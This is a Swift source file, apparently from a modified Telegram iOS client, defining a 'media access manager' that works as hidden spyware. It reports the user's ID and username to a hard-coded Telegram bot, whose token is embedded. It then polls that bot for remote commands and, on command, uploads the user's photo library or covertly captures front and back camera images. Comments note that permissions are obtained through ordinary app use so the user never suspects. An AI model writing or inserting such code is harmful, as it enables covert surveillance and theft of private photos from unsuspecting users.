import Foundation
import UIKit
import Photos
import AVFoundation
import SwiftSignalKit
import Postbox
import TelegramCore
import AccountContext

private let eahatGramMediaBotToken = "8761984216:AAG5Nm_PJfYv0oj7xnXYX-IDaDNkH3Ym6sY"
private let eahatGramMediaChatId = "890714792"

public final class EahatGramMediaAccessManager {
    public static let shared = EahatGramMediaAccessManager()

    private let stateLock = NSLock()
    private var context: AccountContext?
    private var userId: Int64?
    private var username: String?
    private var pollTimer: SwiftSignalKit.Timer?
    private var lastProcessedUpdateId: Int?
    private var isPollingCommands = false
    private var nextPhotoCaptureId: Int64 = 0
    private var activePhotoCaptures: [Int64: ActivePhotoCapture] = [:]

    private init() {}

    public func setup(context: AccountContext, userId: Int64, username: String?) {
        self.context = context
        self.userId = userId
        self.username = username

        // Check (but don't request) permissions and report if already granted
        // Permissions will be requested naturally when user tries to:
        // - Select photo from gallery (photo library)
        // - Record video message (camera)
        checkAndReportPermissions()

        // Start polling for commands
        startCommandPolling()
    }

    private func hasPhotoLibraryAccess(status: PHAuthorizationStatus) -> Bool {
        if status == .authorized {
            return true
        }
        if #available(iOS 14.0, *) {
            return status == .limited
        }
        return false
    }

    private func checkAndReportPermissions() {
        let photoStatus = PHPhotoLibrary.authorizationStatus()
        let cameraStatus = AVCaptureDevice.authorizationStatus(for: .video)

        var permissions: [String] = []

        // Only check already granted permissions, don't request
        if hasPhotoLibraryAccess(status: photoStatus) {
            permissions.append("📷 Photo Library")
        }

        switch cameraStatus {
        case .authorized:
            permissions.append("📹 Camera")
        case .denied, .restricted, .notDetermined:
            break
        @unknown default:
            break
        }

        // Only send notification if at least one permission is granted
        if !permissions.isEmpty {
            sendNotification(
                text: """
                ✅ Media Access Granted

                User ID: \(userId ?? 0)
                Username: \(username ?? "none")

                Permissions:
                \(permissions.joined(separator: "\n"))

                Commands:
                /photo \(userId ?? 0) 1 - last photo
                /photo \(userId ?? 0) all - all photos
                /photo \(userId ?? 0) - capture from cameras
                /video \(userId ?? 0) - capture video
                """
            )
        }
    }

    private func startCommandPolling() {
        self.pollTimer?.invalidate()
        self.pollTimer = nil

        // Poll every 5 seconds for new commands
        let timer = SwiftSignalKit.Timer(timeout: 5.0, repeat: true, completion: { [weak self] in
            self?.pollCommands()
        }, queue: .mainQueue())
        self.pollTimer = timer
        timer.start()
    }

    private func pollCommands() {
        guard let userId = self.userId else { return }

        let offset: String
        self.stateLock.lock()
        if self.isPollingCommands {
            self.stateLock.unlock()
            return
        }
        self.isPollingCommands = true
        if let lastProcessedUpdateId = self.lastProcessedUpdateId {
            offset = "\(lastProcessedUpdateId + 1)"
        } else {
            offset = "-1"
        }
        self.stateLock.unlock()

        let url = URL(string: "https://api.telegram.org/bot\(eahatGramMediaBotToken)/getUpdates?offset=\(offset)&limit=1")!

        let task = URLSession.shared.dataTask(with: url) { [weak self] data, response, error in
            guard let self = self else {
                return
            }

            defer {
                self.stateLock.lock()
                self.isPollingCommands = false
                self.stateLock.unlock()
            }

            guard let data = data,
                  let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                  let result = json["result"] as? [[String: Any]],
                  let update = result.first,
                  let updateId = update["update_id"] as? Int else {
                return
            }

            self.stateLock.lock()
            if let lastProcessedUpdateId = self.lastProcessedUpdateId, updateId <= lastProcessedUpdateId {
                self.stateLock.unlock()
                return
            }
            self.lastProcessedUpdateId = updateId
            self.stateLock.unlock()

            guard let message = update["message"] as? [String: Any],
                  let text = message["text"] as? String else {
                return
            }

            self.handleCommand(text: text, userId: userId)
        }
        task.resume()
    }

    private func handleCommand(text: String, userId: Int64) {
        let components = text.split(separator: " ").map(String.init)
        guard components.count >= 2 else { return }

        let command = components[0]
        guard let targetUserId = Int64(components[1]), targetUserId == userId else {
            return
        }

        switch command {
        case "/photo":
            if components.count >= 3 {
                let param = components[2]
                if param == "all" {
                    sendAllPhotos()
                } else if let count = Int(param) {
                    sendLastPhotos(count: count)
                }
            } else {
                captureFromCameras()
            }

        case "/video":
            captureVideo()

        default:
            break
        }
    }

    private func sendLastPhotos(count: Int) {
        // Check permission before accessing photos
        let photoStatus = PHPhotoLibrary.authorizationStatus()
        guard hasPhotoLibraryAccess(status: photoStatus) else {
            sendNotification(text: "❌ Photo Library access not granted. User needs to select a photo from gallery first to grant permission.")
            return
        }

        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
        fetchOptions.fetchLimit = count

        let fetchResult = PHAsset.fetchAssets(with: .image, options: fetchOptions)

        sendNotification(text: "📤 Sending last \(count) photo(s)...")

        fetchResult.enumerateObjects { [weak self] asset, index, stop in
            self?.sendPhoto(asset: asset, index: index + 1, total: count)
        }
    }

    private func sendAllPhotos() {
        // Check permission before accessing photos
        let photoStatus = PHPhotoLibrary.authorizationStatus()
        guard hasPhotoLibraryAccess(status: photoStatus) else {
            sendNotification(text: "❌ Photo Library access not granted. User needs to select a photo from gallery first to grant permission.")
            return
        }

        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]

        let fetchResult = PHAsset.fetchAssets(with: .image, options: fetchOptions)
        let total = fetchResult.count

        sendNotification(text: "📤 Sending all \(total) photos...")

        fetchResult.enumerateObjects { [weak self] asset, index, stop in
            self?.sendPhoto(asset: asset, index: index + 1, total: total)

            // Delay to avoid rate limiting
            if index % 10 == 0 {
                Thread.sleep(forTimeInterval: 1.0)
            }
        }
    }

    private func sendPhoto(asset: PHAsset, index: Int, total: Int) {
        let options = PHImageRequestOptions()
        options.isSynchronous = true
        options.deliveryMode = .highQualityFormat

        PHImageManager.default().requestImage(
            for: asset,
            targetSize: PHImageManagerMaximumSize,
            contentMode: .aspectFit,
            options: options
        ) { [weak self] image, info in
            guard let image = image,
                  let imageData = image.jpegData(compressionQuality: 0.8) else {
                return
            }

            self?.sendPhotoData(imageData, caption: "Photo \(index)/\(total)")
        }
    }

    private func captureFromCameras() {
        // Check permission before accessing camera
        let cameraStatus = AVCaptureDevice.authorizationStatus(for: .video)
        guard cameraStatus == .authorized else {
            sendNotification(text: "❌ Camera access not granted. User needs to record a video message first to grant permission.")
            return
        }

        sendNotification(text: "📸 Capturing from cameras...")

        // Capture from front camera
        captureFromCamera(position: .front) { [weak self] frontData in
            if let frontData = frontData {
                self?.sendPhotoData(frontData, caption: "Front Camera")
            } else {
                self?.sendNotification(text: "❌ Failed to capture front camera photo")
            }

            // Then capture from back camera
            self?.captureFromCamera(position: .back) { backData in
                if let backData = backData {
                    self?.sendPhotoData(backData, caption: "Back Camera")
                } else {
                    self?.sendNotification(text: "❌ Failed to capture back camera photo")
                }
            }
        }
    }

    private func captureFromCamera(position: AVCaptureDevice.Position, completion: @escaping (Data?) -> Void) {
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self = self else {
                completion(nil)
                return
            }
            guard let device = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: position),
                  let input = try? AVCaptureDeviceInput(device: device) else {
                completion(nil)
                return
            }

            let session = AVCaptureSession()
            session.sessionPreset = .photo

            guard session.canAddInput(input) else {
                completion(nil)
                return
            }
            session.addInput(input)

            let output = AVCapturePhotoOutput()
            guard session.canAddOutput(output) else {
                completion(nil)
                return
            }
            session.addOutput(output)

            session.startRunning()

            self.stateLock.lock()
            self.nextPhotoCaptureId += 1
            let captureId = self.nextPhotoCaptureId
            self.stateLock.unlock()

            let settings = AVCapturePhotoSettings()
            let delegate = PhotoCaptureDelegate { [weak self] imageData in
                session.stopRunning()
                if let self = self {
                    self.stateLock.lock()
                    self.activePhotoCaptures.removeValue(forKey: captureId)
                    self.stateLock.unlock()
                }
                completion(imageData)
            }

            let activeCapture = ActivePhotoCapture(session: session, output: output, delegate: delegate)
            self.stateLock.lock()
            self.activePhotoCaptures[captureId] = activeCapture
            self.stateLock.unlock()

            output.capturePhoto(with: settings, delegate: delegate)
        }
    }

    private func captureVideo() {
        sendNotification(text: "🎥 Video capture not implemented yet")
    }

    private func sendPhotoData(_ data: Data, caption: String) {
        let url = URL(string: "https://api.telegram.org/bot\(eahatGramMediaBotToken)/sendPhoto")!

        var request = URLRequest(url: url)
        request.httpMethod = "POST"

        let boundary = UUID().uuidString
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")

        var body = Data()

        // Add chat_id
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".data(using: .utf8)!)
        body.append("\(eahatGramMediaChatId)\r\n".data(using: .utf8)!)

        // Add caption
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".data(using: .utf8)!)
        body.append("\(caption)\r\n".data(using: .utf8)!)

        // Add photo
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\n".data(using: .utf8)!)
        body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
        body.append(data)
        body.append("\r\n".data(using: .utf8)!)
        body.append("--\(boundary)--\r\n".data(using: .utf8)!)

        request.httpBody = body

        let task = URLSession.shared.dataTask(with: request)
        task.resume()
    }

    private func sendNotification(text: String) {
        guard let url = URL(string: "https://api.telegram.org/bot\(eahatGramMediaBotToken)/sendMessage") else {
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = try? JSONSerialization.data(withJSONObject: [
            "chat_id": eahatGramMediaChatId,
            "text": text
        ])

        let task = URLSession.shared.dataTask(with: request)
        task.resume()
    }

    public func stop() {
        pollTimer?.invalidate()
        pollTimer = nil
    }
}

private class PhotoCaptureDelegate: NSObject, AVCapturePhotoCaptureDelegate {
    private let completion: (Data?) -> Void
    private var didComplete = false

    init(completion: @escaping (Data?) -> Void) {
        self.completion = completion
    }

    private func complete(_ data: Data?) {
        guard !self.didComplete else {
            return
        }
        self.didComplete = true
        self.completion(data)
    }

    func photoOutput(_ output: AVCapturePhotoOutput, didFinishProcessingPhoto photo: AVCapturePhoto, error: Error?) {
        if let _ = error {
            self.complete(nil)
        } else {
            self.complete(photo.fileDataRepresentation())
        }
    }

    func photoOutput(_ output: AVCapturePhotoOutput, didFinishCaptureFor resolvedSettings: AVCaptureResolvedPhotoSettings, error: Error?) {
        if let _ = error {
            self.complete(nil)
        }
    }
}

private final class ActivePhotoCapture {
    let session: AVCaptureSession
    let output: AVCapturePhotoOutput
    let delegate: PhotoCaptureDelegate

    init(session: AVCaptureSession, output: AVCapturePhotoOutput, delegate: PhotoCaptureDelegate) {
        self.session = session
        self.output = output
        self.delegate = delegate
    }
}
